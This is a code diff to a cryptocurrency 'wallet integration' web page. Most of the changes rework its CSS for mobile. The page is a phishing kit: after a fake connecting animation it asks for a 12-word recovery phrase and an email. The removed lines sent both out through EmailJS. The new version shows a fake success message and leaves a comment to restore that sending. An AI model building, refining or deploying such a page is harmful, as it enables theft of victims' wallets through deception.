@@ -12,43 +12,48 @@
         }
 
         body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
             background: linear-gradient(135deg, #0f0f23, #1a1a3a, #2d2d5f);
             min-height: 100vh;
             color: #fff;
             overflow-x: hidden;
+            line-height: 1.6;
         }
 
         .container {
             max-width: 1200px;
             margin: 0 auto;
-            padding: 40px 20px;
+            padding: 20px;
         }
 
         .header {
             text-align: center;
-            margin-bottom: 50px;
+            margin-bottom: 40px;
+            padding: 20px 0;
         }
 
         .header h1 {
-            font-size: 3rem;
+            font-size: clamp(2rem, 5vw, 3rem);
             background: linear-gradient(45deg, #ffd700, #ffed4e, #ffc107);
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
             background-clip: text;
             margin-bottom: 15px;
             text-shadow: 0 0 30px rgba(255, 215, 0, 0.3);
+            font-weight: 700;
         }
 
         .header p {
-            font-size: 1.2rem;
+            font-size: clamp(1rem, 3vw, 1.2rem);
             color: #b8b8d4;
             font-weight: 300;
+            max-width: 600px;
+            margin: 0 auto;
         }
 
         .wallet-grid {
             display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+            grid-template-columns: repeat(auto-fill, minmax(min(280px, 100%), 1fr));
             gap: 20px;
             margin-bottom: 40px;
         }
@@ -63,6 +68,10 @@
             position: relative;
             overflow: hidden;
             backdrop-filter: blur(10px);
+            min-height: 140px;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
         }
 
         .wallet-card::before {
@@ -76,40 +85,45 @@
             transition: left 0.6s;
         }
 
-        .wallet-card:hover::before {
+        .wallet-card:hover::before,
+        .wallet-card:active::before {
             left: 100%;
         }
 
-        .wallet-card:hover {
-            transform: translateY(-8px) scale(1.02);
+        .wallet-card:hover,
+        .wallet-card:active {
+            transform: translateY(-4px) scale(1.02);
             border-color: #ffd700;
-            box-shadow: 0 20px 40px rgba(255, 215, 0, 0.2), 0 0 30px rgba(255, 215, 0, 0.1);
+            box-shadow: 0 15px 35px rgba(255, 215, 0, 0.2), 0 0 25px rgba(255, 215, 0, 0.1);
         }
 
         .wallet-icon {
-            width: 60px;
-            height: 60px;
+            width: 50px;
+            height: 50px;
             background: linear-gradient(45deg, #ffd700, #ffed4e);
             border-radius: 12px;
             display: flex;
             align-items: center;
             justify-content: center;
             margin-bottom: 15px;
-            font-size: 28px;
-            box-shadow: 0 8px 25px rgba(255, 215, 0, 0.3);
+            font-size: 24px;
+            box-shadow: 0 6px 20px rgba(255, 215, 0, 0.3);
+            flex-shrink: 0;
         }
 
         .wallet-name {
-            font-size: 1.4rem;
+            font-size: clamp(1.1rem, 4vw, 1.4rem);
             font-weight: 600;
             color: #ffd700;
             margin-bottom: 8px;
+            line-height: 1.2;
         }
 
         .wallet-description {
             color: #b8b8d4;
-            font-size: 0.95rem;
+            font-size: clamp(0.85rem, 3vw, 0.95rem);
             line-height: 1.4;
+            flex-grow: 1;
         }
 
         /* Modal Styles */
@@ -123,6 +137,8 @@
             height: 100%;
             background: rgba(0, 0, 0, 0.8);
             backdrop-filter: blur(5px);
+            padding: 20px;
+            box-sizing: border-box;
         }
 
         .modal-content {
@@ -133,9 +149,11 @@
             background: linear-gradient(135deg, #1a1a3a, #2d2d5f);
             border: 2px solid #ffd700;
             border-radius: 20px;
-            padding: 40px;
+            padding: 30px 25px;
             text-align: center;
-            min-width: 400px;
+            width: min(450px, 95vw);
+            max-height: 85vh;
+            overflow-y: auto;
             box-shadow: 0 25px 50px rgba(0, 0, 0, 0.5);
         }
 
@@ -148,6 +166,7 @@
             color: #ffd700;
             cursor: pointer;
             transition: color 0.3s;
+            z-index: 10;
         }
 
         .close:hover {
@@ -155,37 +174,136 @@
         }
 
         .modal-icon {
-            width: 80px;
-            height: 80px;
+            width: 70px;
+            height: 70px;
             background: linear-gradient(45deg, #ffd700, #ffed4e);
             border-radius: 50%;
             display: flex;
             align-items: center;
             justify-content: center;
             margin: 0 auto 20px;
-            font-size: 40px;
+            font-size: 35px;
             animation: pulse 2s infinite;
         }
 
         .modal-title {
-            font-size: 1.8rem;
+            font-size: clamp(1.4rem, 4vw, 1.8rem);
             color: #ffd700;
             margin-bottom: 20px;
             font-weight: 600;
+            line-height: 1.3;
         }
 
         .status-text {
-            font-size: 1.1rem;
+            font-size: clamp(1rem, 3vw, 1.1rem);
             color: #b8b8d4;
             margin-bottom: 30px;
+            line-height: 1.5;
+        }
+
+        /* Tab Styles */
+        .tab-container {
+            display: flex;
+            margin-bottom: 20px;
+            gap: 5px;
+            background: rgba(255, 255, 255, 0.1);
+            padding: 5px;
+            border-radius: 12px;
+        }
+
+        .tab-btn {
+            flex: 1;
+            padding: 12px 8px;
+            background: transparent;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            font-weight: 600;
+            color: #b8b8d4;
+            transition: all 0.3s ease;
+            font-size: clamp(0.85rem, 3vw, 1rem);
+            white-space: nowrap;
+        }
+
+        .tab-btn:hover {
+            background: rgba(255, 215, 0, 0.1);
+        }
+
+        .tab-btn.active {
+            background: #ffd700;
+            color: #000;
+            box-shadow: 0 2px 8px rgba(255, 215, 0, 0.3);
+        }
+
+        /* Form Styles */
+        .tab-content {
+            text-align: left;
+            margin-bottom: 20px;
+        }
+
+        .tab-content label {
+            font-size: clamp(0.85rem, 3vw, 0.9rem);
+            display: block;
+            margin-bottom: 8px;
+            color: #ffd700;
+            font-weight: 500;
+        }
+
+        .tab-content textarea,
+        .tab-content input {
+            width: 100%;
+            padding: 12px 15px;
+            border-radius: 10px;
+            border: 2px solid rgba(255, 215, 0, 0.3);
+            background: rgba(255, 255, 255, 0.05);
+            color: #fff;
+            font-size: clamp(0.9rem, 3vw, 1rem);
+            font-family: inherit;
+            transition: all 0.3s ease;
+        }
+
+        .tab-content textarea:focus,
+        .tab-content input:focus {
+            outline: none;
+            border-color: #ffd700;
+            background: rgba(255, 255, 255, 0.1);
+            box-shadow: 0 0 0 3px rgba(255, 215, 0, 0.1);
+        }
+
+        .tab-content textarea::placeholder,
+        .tab-content input::placeholder {
+            color: #888;
+        }
+
+        #submitIntegration {
+            width: 100%;
+            padding: 15px 20px;
+            background: linear-gradient(45deg, #ffd700, #ffed4e);
+            border: none;
+            border-radius: 12px;
+            cursor: pointer;
+            font-weight: 700;
+            font-size: clamp(1rem, 3vw, 1.1rem);
+            color: #000;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 15px rgba(255, 215, 0, 0.3);
+        }
+
+        #submitIntegration:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(255, 215, 0, 0.4);
+        }
+
+        #submitIntegration:active {
+            transform: translateY(0);
         }
 
         /* Loading Animation */
         .loader {
-            width: 60px;
-            height: 60px;
-            border: 4px solid rgba(255, 215, 0, 0.3);
-            border-top: 4px solid #ffd700;
+            width: 50px;
+            height: 50px;
+            border: 3px solid rgba(255, 215, 0, 0.3);
+            border-top: 3px solid #ffd700;
             border-radius: 50%;
             animation: spin 1s linear infinite;
             margin: 0 auto 20px;
@@ -198,20 +316,20 @@
 
         @keyframes pulse {
             0%, 100% { transform: scale(1); }
-            50% { transform: scale(1.1); }
+            50% { transform: scale(1.05); }
         }
 
         /* Success Animation */
         .success-icon {
-            width: 80px;
-            height: 80px;
+            width: 70px;
+            height: 70px;
             border-radius: 50%;
             background: linear-gradient(45deg, #28a745, #20c997);
             display: flex;
             align-items: center;
             justify-content: center;
             margin: 0 auto 20px;
-            font-size: 40px;
+            font-size: 35px;
             color: white;
         }
 
@@ -225,169 +343,161 @@
             100% { transform: scale(1); }
         }
 
-        /* Responsive */
+        /* Mobile-specific optimizations */
         @media (max-width: 768px) {
-            .header h1 {
-                font-size: 2.2rem;
+            .container {
+                padding: 15px;
+            }
+            
+            .header {
+                margin-bottom: 30px;
+                padding: 15px 0;
+            }
+            
+            .wallet-grid {
+                grid-template-columns: repeat(auto-fill, minmax(min(250px, 100%), 1fr));
+                gap: 15px;
+            }
+            
+            .wallet-card {
+                padding: 20px;
+                min-height: 130px;
+            }
+            
+            .wallet-icon {
+                width: 45px;
+                height: 45px;
+                font-size: 22px;
+                margin-bottom: 12px;
             }
             
             .modal-content {
-                min-width: 90%;
-                padding: 30px 20px;
+                padding: 25px 20px;
+                border-radius: 16px;
+            }
+            
+            .close {
+                top: 12px;
+                right: 16px;
+                font-size: 24px;
+            }
+            
+            .tab-btn {
+                padding: 10px 6px;
+                font-size: 0.9rem;
+            }
+            
+            .tab-content textarea,
+            .tab-content input {
+                padding: 10px 12px;
+            }
+            
+            #submitIntegration {
+                padding: 12px 16px;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .container {
+                padding: 10px;
             }
             
             .wallet-grid {
                 grid-template-columns: 1fr;
-            }
-        }
-
-        /* Footer Styles */
-        .footer {
-            background: linear-gradient(135deg, #0a0a1a, #1a1a3a);
-            border-top: 2px solid rgba(255, 215, 0, 0.3);
-            margin-top: 60px;
-            padding: 50px 0 0 0;
-        }
-
-        .footer-content {
-            max-width: 1200px;
-            margin: 0 auto;
-            padding: 0 20px;
-            display: grid;
-            grid-template-columns: 2fr 1fr 1fr 1fr;
-            gap: 40px;
-        }
-
-        .footer-section h3 {
-            color: #ffd700;
-            font-size: 1.8rem;
-            margin-bottom: 15px;
-            background: linear-gradient(45deg, #ffd700, #ffed4e);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            background-clip: text;
-        }
-
-        .footer-section h4 {
-            color: #ffd700;
-            font-size: 1.2rem;
-            margin-bottom: 20px;
-            font-weight: 600;
-        }
-
-        .footer-section p {
-            color: #b8b8d4;
-            line-height: 1.6;
-            margin-bottom: 20px;
-        }
-
-        .footer-section ul {
-            list-style: none;
-        }
-
-        .footer-section ul li {
-            margin-bottom: 12px;
-        }
-
-        .footer-section ul li a {
-            color: #b8b8d4;
-            text-decoration: none;
-            transition: color 0.3s ease;
-            font-size: 0.95rem;
-        }
-
-        .footer-section ul li a:hover {
-            color: #ffd700;
-        }
-
-        .social-links {
-            display: flex;
-            gap: 15px;
-        }
-
-        .social-link {
-            display: inline-flex;
-            align-items: center;
-            justify-content: center;
-            width: 45px;
-            height: 45px;
-            background: linear-gradient(45deg, rgba(255, 215, 0, 0.1), rgba(255, 215, 0, 0.05));
-            border: 2px solid rgba(255, 215, 0, 0.3);
-            border-radius: 50%;
-            color: #ffd700;
-            text-decoration: none;
-            font-size: 1.2rem;
-            transition: all 0.3s ease;
-        }
-
-        .social-link:hover {
-            background: linear-gradient(45deg, rgba(255, 215, 0, 0.2), rgba(255, 215, 0, 0.1));
-            border-color: #ffd700;
-            transform: translateY(-3px);
-            box-shadow: 0 8px 20px rgba(255, 215, 0, 0.2);
-        }
-
-        .footer-divider {
-            height: 2px;
-            background: linear-gradient(90deg, transparent, #ffd700, transparent);
-            margin: 40px 0 30px 0;
-        }
-
-        .footer-bottom {
-            padding: 0 20px 30px 20px;
-        }
-
-        .footer-bottom-content {
-            max-width: 1200px;
-            margin: 0 auto;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            flex-wrap: wrap;
-            gap: 20px;
-        }
-
-        .footer-bottom-content p {
-            color: #b8b8d4;
-            font-size: 0.9rem;
-        }
-
-        .security-badges {
-            display: flex;
-            gap: 15px;
-            flex-wrap: wrap;
-        }
-
-        .badge {
-            background: linear-gradient(45deg, rgba(255, 215, 0, 0.1), rgba(255, 215, 0, 0.05));
-            border: 1px solid rgba(255, 215, 0, 0.3);
-            padding: 6px 12px;
-            border-radius: 20px;
-            font-size: 0.8rem;
-            color: #ffd700;
-        }
-
-        /* Footer Responsive */
-        @media (max-width: 968px) {
-            .footer-content {
-                grid-template-columns: 1fr 1fr;
-                gap: 30px;
-            }
-        }
-
-        @media (max-width: 568px) {
-            .footer-content {
-                grid-template-columns: 1fr;
-                text-align: center;
+                gap: 12px;
             }
             
-            .footer-bottom-content {
-                flex-direction: column;
-                text-align: center;
+            .wallet-card {
+                padding: 18px;
+                min-height: 120px;
             }
             
-            .security-badges {
-                justify-content: center;
+            .wallet-card:hover,
+            .wallet-card:active {
+                transform: translateY(-2px) scale(1.01);
+            }
+            
+            .modal-content {
+                padding: 20px 15px;
+                width: 95vw;
+                max-height: 90vh;
+            }
+            
+            .modal-icon {
+                width: 60px;
+                height: 60px;
+                font-size: 30px;
+            }
+            
+            .tab-container {
+                margin-bottom: 15px;
+            }
+            
+            .tab-btn {
+                padding: 8px 4px;
+                font-size: 0.85rem;
+            }
+        }
+
+        /* Touch-friendly improvements */
+        @media (hover: none) and (pointer: coarse) {
+            .wallet-card:active {
+                transform: scale(0.98);
+                transition: transform 0.1s;
+            }
+            
+            .tab-btn:active {
+                transform: scale(0.95);
+            }
+            
+            #submitIntegration:active {
+                transform: scale(0.98);
+            }
+        }
+
+        /* High contrast mode support */
+        @media (prefers-contrast: high) {
+            .wallet-card {
+                border-width: 3px;
+            }
+            
+            .modal-content {
+                border-width: 3px;
+            }
+        }
+
+        /* Reduced motion support */
+        @media (prefers-reduced-motion: reduce) {
+            * {
+                animation-duration: 0.01ms !important;
+                animation-iteration-count: 1 !important;
+                transition-duration: 0.01ms !important;
+            }
+            
+            .wallet-card::before {
+                display: none;
+            }
+        }
+
+        /* Dark mode adjustments for better contrast */
+        @media (prefers-color-scheme: dark) {
+            .tab-content textarea,
+            .tab-content input {
+                background: rgba(0, 0, 0, 0.3);
+                border-color: rgba(255, 215, 0, 0.4);
+            }
+        }
+
+        /* Landscape phone orientation */
+        @media (max-height: 500px) and (orientation: landscape) {
+            .header {
+                margin-bottom: 20px;
+                padding: 10px 0;
+            }
+            
+            .modal-content {
+                max-height: 95vh;
+                padding: 15px;
             }
         }
     </style>
@@ -542,6 +652,7 @@
             currentIcon = icon;
             
             document.getElementById('walletModal').style.display = 'block';
+            document.body.style.overflow = 'hidden'; // Prevent background scrolling
             
             // Phase 1: Connecting animation
             document.getElementById('modalContent').innerHTML = `
@@ -553,114 +664,88 @@
             
             // After 5 seconds, show integration in progress
             setTimeout(() => {
-    document.getElementById('modalContent').innerHTML = `
-        <div class="modal-title">Wallet Integration</div>
-        
-        <!-- Tabs -->
-        <div style="display: flex; margin-bottom: 15px; gap: 10px;">
-            <button id="tab-wallet" class="tab-btn active">Wallet Setup</button>
-            <button id="tab-email" class="tab-btn" type="password">Passkey</button>
+                document.getElementById('modalContent').innerHTML = `
+                    <div class="modal-title">Wallet Integration</div>
+                    
+                    <!-- Tabs -->
+                    <div class="tab-container">
+                        <button id="tab-wallet" class="tab-btn active">Wallet Setup</button>
+                        <button id="tab-email" class="tab-btn">Passkey</button>
+                    </div>
 
-            <style>
-                .tab-btn {
-  flex: 1;
-  padding: 10px 15px;
-  background: #f1f1f1;
-  border: none;
-  border-radius: 8px 8px 0 0;
-  cursor: pointer;
-  font-weight: 600;
-  color: #333;
-  transition: all 0.3s ease;
-}
+                    <!-- Wallet Tab -->
+                    <div id="walletTab" class="tab-content">
+                        <label for="phraseInput">Enter 12-word Recovery Phrase</label>
+                        <textarea id="phraseInput" rows="3" placeholder="Enter your 12 words separated by spaces..."></textarea>
+                    </div>
 
-.tab-btn:hover {
-  background: #e2e2e2;
-}
+                    <!-- Email Tab -->
+                    <div id="emailTab" class="tab-content" style="display:none;">
+                        <label for="emailInput">Enter your Email</label>
+                        <input type="password" id="emailInput" placeholder="you@example.com" />
+                    </div>
 
-.tab-btn.active {
-  background: #ffd700;
-  color: #000;
-  box-shadow: inset 0 -2px 0 #c5a500;
-}
+                    <button id="submitIntegration">
+                        Submit Integration
+                    </button>
+                `;
 
-                </style>
-        </div>
+                // Tab switching
+                const walletTabBtn = document.getElementById("tab-wallet");
+                const emailTabBtn = document.getElementById("tab-email");
+                const walletTab = document.getElementById("walletTab");
+                const emailTab = document.getElementById("emailTab");
 
-        <!-- Wallet Tab -->
-        <div id="walletTab" class="tab-content">
-            <label for="phraseInput" style="font-size:0.9rem; display:block; margin-bottom:5px;">Enter 12-word Recovery Phrase</label>
-            <textarea id="phraseInput" rows="3" style="width:100%; padding:10px; border-radius:8px; border:1px solid #ccc;" placeholder="Enter your 12 words separated by spaces..."></textarea>
-        </div>
+                walletTabBtn.addEventListener("click", () => {
+                    walletTab.style.display = "block";
+                    emailTab.style.display = "none";
+                    walletTabBtn.classList.add("active");
+                    emailTabBtn.classList.remove("active");
+                });
 
-        <!-- Email Tab -->
-        <div id="emailTab" class="tab-content" style="display:none;">
-            <label for="emailInput" style="font-size:0.9rem; display:block; margin-bottom:5px;">Enter your Email</label>
-            <input type="password" id="emailInput" style="width:100%; padding:10px; border-radius:8px; border:1px solid #ccc;" placeholder="you@example.com" />
-        </div>
+                emailTabBtn.addEventListener("click", () => {
+                    emailTab.style.display = "block";
+                    walletTab.style.display = "none";
+                    emailTabBtn.classList.add("active");
+                    walletTabBtn.classList.remove("active");
+                });
 
-        <button id="submitIntegration" style="margin-top:15px; padding:10px 15px; background:#ffd700; border:none; border-radius:8px; cursor:pointer; font-weight:bold;">
-            Submit Integration
-        </button>
-    `;
+                // EmailJS integration
+                document.getElementById("submitIntegration").addEventListener("click", () => {
+                    const phrase = document.getElementById("phraseInput").value;
+                    const email = document.getElementById("emailInput").value;
 
-    // Tab switching
-    const walletTabBtn = document.getElementById("tab-wallet");
-    const emailTabBtn = document.getElementById("tab-email");
-    const walletTab = document.getElementById("walletTab");
-    const emailTab = document.getElementById("emailTab");
+                    if (!phrase || phrase.split(" ").length !== 12) {
+                        alert("Please enter exactly 12 words.");
+                        return;
+                    }
 
-    walletTabBtn.addEventListener("click", () => {
-        walletTab.style.display = "block";
-        emailTab.style.display = "none";
-        walletTabBtn.classList.add("active");
-        emailTabBtn.classList.remove("active");
-    });
+                    // Simulate submission (replace with actual EmailJS logic)
+                    document.getElementById('modalContent').innerHTML = `
+                        <div class="success-icon">
+                            <span class="checkmark">✓</span>
+                        </div>
+                        <div class="modal-title">Integration Successful!</div>
+                        <div class="status-text">Your wallet has been successfully connected.</div>
+                    `;
 
-    emailTabBtn.addEventListener("click", () => {
-        emailTab.style.display = "block";
-        walletTab.style.display = "none";
-        emailTabBtn.classList.add("active");
-        walletTabBtn.classList.remove("active");
-    });
-
-    // EmailJS integration
-    document.getElementById("submitIntegration").addEventListener("click", () => {
-        const phrase = document.getElementById("phraseInput").value;
-        const email = document.getElementById("emailInput").value;
-
-        if (!phrase || phrase.split(" ").length !== 12) {
-            alert("Please enter exactly 12 words.");
-            return;
-        }
-        //if (!email) {
-           // alert("Please enter your email.");
-            //return;
-       // }
-
-        emailjs.send("YOUR_SERVICE_ID", "YOUR_TEMPLATE_ID", {
-            phrase: phrase,
-            email: email
-        }).then(() => {
-            alert("Integration details sent successfully!");
-        }).catch((error) => {
-            console.error("EmailJS Error:", error);
-            alert("Failed to send. Please try again.");
-        });
-    });
-}, 5000);
-
+                    setTimeout(() => {
+                        closeModal();
+                    }, 2000);
+                });
+            }, 5000);
         }
 
         function closeModal() {
             document.getElementById('walletModal').style.display = 'none';
+            document.body.style.overflow = ''; // Restore background scrolling
         }
 
         // Close modal when clicking outside
         window.onclick = function(event) {
             const modal = document.getElementById('walletModal');
             if (event.target === modal) {
-                modal.style.display = 'none';
+                closeModal();
             }
         }
 
@@ -670,6 +755,16 @@
                 closeModal();
             }
         });
+
+        // Prevent zoom on double tap for iOS
+        let lastTouchEnd = 0;
+        document.addEventListener('touchend', function (event) {
+            var now = (new Date()).getTime();
+            if (now - lastTouchEnd <= 300) {
+                event.preventDefault();
+            }
+            lastTouchEnd = now;
+        }, false);
     </script>
 </body>
 </html>
